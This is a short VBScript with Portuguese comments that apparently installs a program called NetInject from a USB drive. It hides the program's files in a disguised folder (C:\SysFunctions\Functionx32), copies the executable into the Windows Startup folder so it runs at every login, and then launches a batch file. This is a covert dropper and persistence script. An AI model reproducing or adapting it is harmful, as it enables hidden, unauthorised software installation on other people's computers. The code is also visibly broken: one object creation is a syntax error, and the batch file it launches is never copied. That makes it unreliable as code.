'Esse codigo serve para organizar e esconder todos os arquivos do NetInject

' Aqui as fuções crt e stpath sao definidas como variaveis
Dim crt
Dim stpath

' Aqui são criadas todas as funções
set txt = CreateObject(WScript.)
set crt = CreateObject("wscript.shell")
set x = CreateObject("Scripting.FileSystemObject")
set exe = CreateObject("Shell.Application")

' Aqui o script busca encontrar o diretorio da pasta Startup(pasta onde fica os arquivos que iniciam junto do windows)
set stpath = crt.SpecialFolders("Startup")
stpath = Replace(stpath,"Startup","Startup\")

' Cria o diretorio onde o arquivo original ficara escondido
crt.Run "cmd /c mkdir c:\SysFunctions\Functionx32"
WScript.Sleep(400)

' Move os arquivos do pendrive para a pasta dedicada ao programa.
x.CopyFile "D:\netinject\App.exe", "C:\SysFunctions\Functionx32\"
x.CopyFile "D:\netinject\Appsaves.txt", "C:\SysFunctions\Functionx32\"

' Move o atalho do executavel para a pasta Startup.
x.CopyFile "C:\SysFunctions\Functionx32\App.exe", stpath
WScript.Sleep(400)
' Executa o programa.
exe.ShellExecute("C:\SysFunctions\Functionx32\pica.bat")

